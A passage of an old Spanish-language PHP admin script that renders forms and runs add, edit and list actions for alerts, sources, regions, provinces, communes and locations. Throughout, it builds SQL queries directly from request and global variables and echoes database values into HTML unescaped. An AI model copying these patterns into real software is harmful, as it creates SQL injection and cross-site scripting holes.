				 <td bgcolor="#f7f7f7">&nbsp;<input type=text name=fecha value="$fecha" size=13 maxlength=10 class=eninput value="dd/mm/aaaa" onfocus="if(this.value=='dd/mm/aaaa')this.value='';" onblur="if(this.value=='')this.value='dd/mm/aaaa';"></td>
				 <td>&nbsp;Hora:</td> 
				 <td bgcolor="#f7f7f7">&nbsp;<input name="hora" type="text" value="$hora" value="HH:MM" size="9" maxlength="5" onfocus="if(this.value=='HH:MM')this.value='';" onblur="if(this.value=='')this.value='HH:MM';"  title="Indique La Hora de la Alerta.">
               </tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
			    <td bgcolor="#dde5f2">&nbsp;Grado:</td>
                <td bgcolor="#f7f7f7" colspan="3">&nbsp;<select name="grado" size="1">
				       <option value="--">Seleccione un Grado ...</option>
HTML;

                       if( $resultados[grado] == "1" ) {
echo <<< HTML
                          <option value="1" SELECTED>Temprana</option>
                          <option value="2" >Amarilla</option>
HTML;
                       } else {
echo <<< HTML
                       <option value="1">Temprana</option>
					   <option value="2" SELECTED>Amarilla</option>
HTML;
                       }
echo <<< HTML
				    </select>
				</td>
               </tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
               <tr align="left" bgcolor=#ffffff>
                <td bgcolor="#dde5f2">&nbsp;Extensi&oacute;n:</td>
				 <td bgcolor="#f7f7f7" colspan="3">&nbsp;<input type=text name=extension size=65 maxlength=100 class=eninput value="$resultados[extension]"></td>
               </tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
               <tr align="left" bgcolor=#ffffff>
                <td bgcolor="#dde5f2">&nbsp;Variable:</td>
				 <td bgcolor="#f7f7f7" colspan="3">&nbsp;<input type=text name=variable size=65 maxlength=100 class=eninput value="$resultados[variable]"></td>
               </tr>
			   <tr><td height="3" bgcolor="#FFFFFF" colspan="2"></td></tr>
               <tr align="left" ><td colspan="4" bgcolor="#dde5f2">&nbsp;Situaci&oacute;n:</td></tr>
			   <tr><td align="center" bgcolor="#f7f7f7" colspan="4"><textarea name=situacion rows=5 cols=75 class=eninput value="$resultados[situacion]">$resultados[situacion]</textarea></td></tr>
			   <tr><td height="2" bgcolor="#FFFFFF" colspan="2"></td></tr>
               <tr align="left"><td colspan="4"  bgcolor="#dde5f2">&nbsp;Orientaci&oacute;n:</td></tr>
			   <tr><td align="center" bgcolor="#f7f7f7" colspan="4"><textarea name=orientacion rows=5 cols=75 class=eninput value="$resultados[orientacion]">$resultados[orientacion]</textarea></td></tr>
			   <tr><td height="1" bgcolor="#FFFFFF" colspan="4"></td></tr>
               <tr><td height=15 ColSpan="4"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="4" height="40">
                 <div align="center">
                   <input type="image" name="modificaalerta" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="4" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="4"></td></tr>
              <tr><td ColSpan="4" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_alerta);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}
	  




// Modifica FUENTE
if ($HTTP_GET_VARS['accion']=="modifica_fuente"){
     $id = $HTTP_GET_VARS['id'];

     cabeceraHTML();
     cabeceraUsualHTML();
     cabeceraFuenteHTML();

    $con_fuente = mysql_query("SELECT * FROM FUENTE WHERE id='$id'") Or DIE("Imposible Realizar Consulta en Tabla Fuente en este Momento ... Intente Nuevamente");

     while($resultados = mysql_fetch_array($con_fuente)) {
      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Modificar Fuente</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
echo <<< HTML
    <form method="post" action="$PHP_SELF?accion=edita_fuente" onSubmit="return validaModFuente();" name="form">
                <input type="hidden" name="id" value="$resultados[id]">
              <tr  bgcolor=#dde5f2 valign=middle>
                <td width="35%">&nbsp;Nombre</td>
                <td><input type="text" name="nombre" size=35 maxlenght=50 class="eninput" value="$resultados[nombre]"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Nivel</td>
                <td><input type="text" name="nivel" size=2 maxlenght=2 class="eninput"  value="$resultados[nivel]"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Cargo</td>
                <td><input type="text" name="cargo" size=30 maxlenght=30 class="eninput" value="$resultados[cargo]"></td>
              </tr>
              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Tel&eacute;fono</td>
                <td><input type="text" name="fono" size=15 maxlenght=15 class="eninput"  value="$resultados[fono]" OnKeyPress="return numbersonly(this, event)"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Celular</td>
                <td><input type="text" name="celular" size=10 maxlenght=10 class="eninput"  value="$resultados[celular]" OnKeyPress="return numbersonly(this, event)"></td>
              </tr>

              <tr bgcolor="#ffffff">
                 <td ColSpan=2 height=1></td>
              </tr>

              <tr bgcolor=#dde5f2 valign=middle>
                <td>&nbsp;Email</td>
                <td><input type="text" name="email" size=35 maxlenght=50 class="eninput"  value="$resultados[email]" onChange="return validarEmail(this.form.email.value);"></td>
              </tr>

              <tr bgcolor="#dde5f2" valign=middle>
                 <td ColSpan=2 height=5></td>
              </tr>
              <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="modificafuente" src="../imagenes/modificar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
     }
     mysql_free_result($con_fuente);
     mysql_close();
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

}


// ----------------------------------------------- <<< Area de Region >>> --------------------
if ($HTTP_GET_VARS['accion'] == "region") {

      // Visualizar Registro de Tabla Region
      $con_region = mysql_query("SELECT * FROM Region") Or Die("Imposible Realizar Consulta a Tabla Regi�n en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML(); 
      cabeceraRegionHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_region) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td align=center>Id.Regi&oacute;n</td><td width=1 bgcolor=#ffffff></td><td>Regi&oacute;n</td><td ColSpan=4></tr>'); 

           while($row=mysql_fetch_object($con_region)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td align=center>$row->idreg</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td>$row->region</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_region&id=$row->idreg" class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_region&id=$row->idreg" class="orangenone">Eliminar</td>
HTML;
             echo "<tr bgcolor=#ffffff><td ColSpan=2 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_region);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}  


if ($HTTP_GET_VARS['accion']=="edita_region"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas Nombre de la Regi�n
     $nnombreregion = strtoupper($nnombreregion);

   mysql_query("UPDATE Region SET region='$nnombreregion' WHERE idreg='$id'") or DIE("Imposible Modificar Regi�n .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=region");
   exit;
  }


if ($HTTP_GET_VARS['accion'] == "agregar_region") {
   // Agregar Region
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraRegionHTML();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega Region</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_region" onSubmit="return validaRegion();" name="form">
                <td>Id. Regi&oacute;n</td><td>Regi&oacute;n</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nroregion size=2 maxlength=2 class=eninput>&nbsp;</td>
                <td><input type=text name=nnombreregion size=30 maxlength=30 class=eninput>&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Regi&oacute;n debe ser valor comprendido entre 1 a 12, Regi&oacute;n Metropolitana debe ser RM</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaregion" src="../imagenes/agregar.gif"> 
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

 
if ($HTTP_GET_VARS['accion'] == "nueva_region") {
  // Agregar Region a Tabla de Regiones
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables
       if (strlen($nroregion) == 1) {
          $nroregion = "0".$nroregion;
       }

       if ($nroregion == "00"){
          $error_accion_ms = "El Id. de Regi�n debe ser un valor comprendido entre 1 y 12 ..!!!";
          mensaje_error($error_accion_ms);
       } else {

         // Convertir a May�sculas Nombre de la Regi�n
            $nnombreregion = strtoupper($nnombreregion);

        // Chequear en Tabla Region, existencia de dato a ingresar
           $con_region = mysql_query("SELECT count(*) as cantidad FROM Region WHERE idreg='$nroregion'") Or DIE("Imposible Relizar Consulta en Tabla Regiones en este Momento ... Intente Nuevamente");
 
           $rowregion = mysql_fetch_array($con_region);
           $ExisteReg = $rowregion[cantidad];
           mysql_free_result($con_region); 

           if ($ExisteReg > 0) {
             // Regi�n Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);  
           } else {
            //Agregar a Tabla Regiones
              $nnombreregion = strtoupper($nnombreregion);
              mysql_query("INSERT INTO Region(idreg,region) VALUES('$nroregion','$nnombreregion')") or DIE("Imposible Guardar Registro en Tabla de Regiones .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado la Siguiente Informaci&oacute;n: Regi&oacute;n ". $nroregion.",". $nnombreregion. " ";
             mensaje_aviso($aviso_accion_ms);
          }
        
          mysql_close();
     }
     echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}
// ----------------------------------------------- <<< FIN Area de Region >>> --------------------


// ----------------------------------------------- <<< Area de Provincia >>> --------------------
if ($HTTP_GET_VARS['accion'] == "provincia") {

      // Visualizar Registro de Tabla Provincia
      $con_provin = mysql_query("SELECT Provincia.idpro as idprov, Provincia.provincia as provincia, Region.idreg as idregion, Region.region as region FROM Provincia INNER JOIN Region ON Provincia.idreg = Region.idreg") Or Die("Imposible Realizar Consulta a Tabla Provincia en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraProvinciaHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_provin) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Regi&oacute;n</td><td width=1 bgcolor=#ffffff></td><td align=center>Id. Prov.</td><td width=1 bgcolor=#ffffff><td>Provincia</td><td ColSpan=9></tr>');

           while($row=mysql_fetch_object($con_provin)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td>$row->region</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td align=center>$row->idprov</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->provincia</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_provincia&id=$row->idregion&id_p=$row->idprov" class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_provincia&id=$row->idregion&id_p=$row->idprov" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=9 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_provin);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}


if ($HTTP_GET_VARS['accion'] == "agregar_provincia") {
   // Agregar Region
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraProvinciaHTML();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega Provincia</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_provincia" onSubmit="return validaProvincia();" name="form">
                <td>Regi&oacute;n</td><td>Id. Prov</td><td>Provincia</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea><td>
HTML;
VerRegiones();
echo <<< HTML
                </td><td><input type=text name=nroprovincia size=2 maxlength=2 class=eninput>&nbsp;</td>
                <td><input type=text name=nombreprovincia size=30 maxlength=30 class=eninput>&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="3" class="nota">Id. Provincia debe ser un valor num&eacute;rico de acuerdo a orden de precedencia en la Regi&oacute;n</td>
               </tr>
               <tr><td height=15 ColSpan="3"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="3" height="40">
                 <div align="center">
                   <input type="image" name="agregarprovincia" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="3" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="3"></td></tr>
              <tr><td ColSpan="3" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "nueva_provincia") {
  // Agregar Region a Tabla de Provincia
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables
       $nroregion = $region;

       if (strlen($nroprovincia) == 1) {
          $nroprovincia = "0".$nroprovincia;
       }

       // Convertir a May�sculas Nombre de la Provincia
          $nombreprovincia = strtoupper($nombreprovincia);

        // Chequear en Tabla Provincia, existencia de dato a ingresar
           $con_provin = mysql_query("SELECT count(*) as cantidad FROM Provincia WHERE idreg='$region' AND idpro='$nroprovincia'") Or DIE("Imposible Relizar Consulta en Tabla Provincia en este Momento ... Intente Nuevamente");

           $rowexisteprovin = mysql_fetch_array($con_provin);
           $ExisteReg = $rowexisteprovin[cantidad];
           mysql_free_result($con_provin);

           if ($ExisteReg > 0) {
             // Provincia Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla Provincia
              mysql_query("INSERT INTO Provincia(idreg,idpro,provincia) VALUES('$nroregion','$nroprovincia','$nombreprovincia')") or DIE("Imposible Guardar Registro en Tabla de Provincia .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado la Siguiente Provincia ". $nombreprovincia.", a la  Regi&oacute;n ". $nroregion. " ";
             mensaje_aviso($aviso_accion_ms);
        }
        mysql_close();
        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion']=="edita_provincia"){
  $id_r = $HTTP_POST_VARS['id'];
  $id_p = $HTTP_POST_VARS['id_p'];

  // Convertir a May�sculas Nombre de la Regi�n
     $nombreprovincia = strtoupper($nombreprovincia);

   mysql_query("UPDATE Provincia SET provincia='$nombreprovincia' WHERE idreg='$id_r' AND idpro='$id_p'") or DIE("Imposible Modificar Provincia .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=provincia");
   exit;
}
// ----------------------------------------------- <<< FIN Area de Provincia >>> --------------------


// ----------------------------------------------- <<<     Area de Comuna    >>> --------------------
if ($HTTP_GET_VARS['accion'] == "comuna") {

      // Visualizar Registro de Tabla Comuna
      $con_comuna = mysql_query("SELECT Comuna.idcom as idcom, Provincia.idpro as idprov, comuna, provincia, region,  Provincia.idreg as idregion from Provincia inner join Region ON Provincia.idreg = Region.idreg inner join Comuna ON Provincia.idpro = Comuna.idpro AND Provincia.idreg = Comuna.idreg") Or Die("Imposible Realizar Consulta a Tabla Comuna en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraComunaHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_comuna) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Regi&oacute;n</td><td width=1 bgcolor=#ffffff></td><td align=center>Provincia</td><td width=1 bgcolor=#ffffff></td><td>Id. Comuna</td><td width=1 bgcolor=#ffffff></td><td>Comuna</td><td ColSpan=4></tr>');

           while($row=mysql_fetch_object($con_comuna)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td>$row->region</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td align=center>$row->provincia</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->idcom</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->comuna</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_comuna&id=$row->idprov&id_c=$row->idcom"  class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_comuna&id=$row->idprov&id_c=$row->idcom" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=11 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_comuna);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "agregar_comuna") {
   // Agregar Comuna
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraComunaHTML();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega Comuna</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_comuna" onSubmit="return validaComuna();" name="form"
>
                <td>Regi&oacute;n/Provincia</td><td>Id. Com</td><td>Comuna</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea><td>
HTML;
VerProvincias();
echo <<< HTML
                </td><td><input type=text name=nrocomuna size=2 maxlength=2 class=eninput>&nbsp;</td>
                <td><input type=text name=nombrecomuna size=30 maxlength=30 class=eninput>&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="3" class="nota">Id. Comuna debe ser un valor num&eacute;rico de acuerdo a orden de precedencia
 en la Provincia</td>
               </tr>
               <tr><td height=15 ColSpan="3"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="3" height="40">
                 <div align="center">
                   <input type="image" name="agregarcomuna" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="3" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../im
agenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="3"></td></tr>
              <tr><td ColSpan="3" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


if ($HTTP_GET_VARS['accion'] == "nueva_comuna") {
  // Agregar Region a Tabla de Comuna
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables
      $idregi = substr($regionprovincia,0,2);
      $idprov = substr($regionprovincia,strpos($regionprovincia,"/") +1,2);

       if (strlen($nrocomuna) == 1) {
          $nrocomuna = "0".$nrocomuna;
       }

       // Convertir a May�sculas Nombre de la Provincia
          $nombrecomuna = strtoupper($nombrecomuna);

        // Chequear en Tabla Comuna, existencia de dato a ingresar
           $con_comuna = mysql_query("SELECT count(*) as cantidad FROM Comuna WHERE idpro='$idprov' AND idcom='$nrocomuna' AND idreg = '$idregi' ") Or DIE("Imposible Relizar Consulta en Tabla Provincia en este Momento ... Intente Nuevamente");

           $rowexistecomuna = mysql_fetch_array($con_comuna);
           $ExisteReg = $rowexistecomuna[cantidad];
           mysql_free_result($con_comuna);

           if ($ExisteReg > 0) {
             // Comuna Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla Comuna
              mysql_query("INSERT INTO Comuna(idreg,idpro,idcom,comuna) VALUES('$idregi','$idprov','$nrocomuna','$nombrecomuna')") or DIE("Imposible Guardar Registro en Tabla de Comuna .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado la Siguiente Comuna ". $nombrecomuna.", en la  Region de $idregi, Provincia ". $idprov. " ";
             mensaje_aviso($aviso_accion_ms);
           }
           mysql_close();

        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion']=="edita_comuna"){
  $id_p = $HTTP_POST_VARS['id'];
  $id_c = $HTTP_POST_VARS['id_c'];

  // Convertir a May�sculas Nombre de la Comuna
     $nombrecomuna = strtoupper($nombrecomuna);

   mysql_query("UPDATE Comuna SET comuna='$nombrecomuna' WHERE idpro='$id_p' AND idcom='$id_c'") or DIE("Imposible Modificar Comuna .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=comuna");
   exit;
}
// ----------------------------------------------- <<<    FIN Area de Comuna    >>> --------------------


// ----------------------------------------------- <<<    Area de Ubicacion    >>> --------------------
if ($HTTP_GET_VARS['accion'] == "ubicacion") {

      // Visualizar Registro de Tabla Ubicacion
      $con_ubicacion = mysql_query("SELECT *  FROM Ubicacion") or Die("Imposible Realizar Consulta a Tabla Ubicacion en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraUbicacionHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_ubicacion) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Id.</td><td width=1 bgcolor=#ffffff></td><td >Ubicaci&oacute;n</td><td ColSpan=4></tr>');

           while($row=mysql_fetch_object($con_ubicacion)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td align=center>$row->idubicacion</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->ubicacion</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_ubicacion&id=$row->idubicacion"  class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_ubicacion&id=$row->idubicacion" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=11 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_ubicacion);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "agregar_ubicacion") {
   // Agregar Ubicacion
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraUbicacionHTML();

      $con_ubicacion = mysql_query("SELECT count(idubicacion) as cantidad FROM Ubicacion") or Die("Imposible Realizar Consulta a Tabla Ubicacion .. Ha ocurrido un Error Inesperado .. !!!");
      $row = mysql_fetch_array($con_ubicacion);
      $numreg = $row[cantidad] + 1;
      mysql_free_result($con_ubicacion);

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega TipoEvento</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_ubicacion" onSubmit="return validaUbicacion();" name="form">
                <td>Id.</td><td>Ubicacion</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nroubicacion size=2 maxlength=2 class=eninput value="$numreg" onKeyPress="return numbersonly(this, event)">&nbsp;</td>
                <td><input type=text name=nombreubicacion size=20 maxlength=20 class=eninput>&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaubicacion" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../im
agenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "nueva_ubicacion") {
  // Agregar Nuevo Tipo de Evento  a Tabla Ubicacion
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables


       // Convertir a May�sculas Nombre del Ubicacion
          $nombreubicacion = strtoupper($nombreubicacion);

       // Chequear en Tabla ubicacion, existencia de dato a ingresar
          $con_ubicacion = mysql_query("SELECT count(*) as cantidad FROM Ubicacion WHERE idubicacion=$nroubicacion") Or DIE("Imposible Relizar Consulta en Tabla Ubicacion en este Momento ... Intente Nuevamente");
